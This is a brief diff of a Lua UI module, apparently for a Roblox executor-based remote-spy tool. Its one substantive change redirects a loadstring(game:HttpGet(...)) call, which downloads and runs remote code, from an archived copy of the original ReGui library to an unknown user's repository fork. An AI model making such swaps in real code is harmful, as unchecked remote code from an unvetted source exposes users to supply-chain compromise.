@@ -74,7 +74,7 @@ type Log = {
 local SetClipboard = setclipboard or toclipboard or set_clipboard
 
 --// Libraries
-local ReGui = loadstring(game:HttpGet('http://web.archive.org/web/20240101000000id_/https://raw.githubusercontent.com/depthso/Dear-ReGui/main/ReGui.lua'), "ReGui")()
+local ReGui = loadstring(game:HttpGet('https://raw.githubusercontent.com/madsnnajot-max/sigma-fixed-2/main/lib/ReGui.lua'), "ReGui")()
 
 --// Modules
 local Flags
@@ -1426,3 +1426,4 @@ function Ui:CreateLog(Data: Log)
 end
 
 return Ui
+
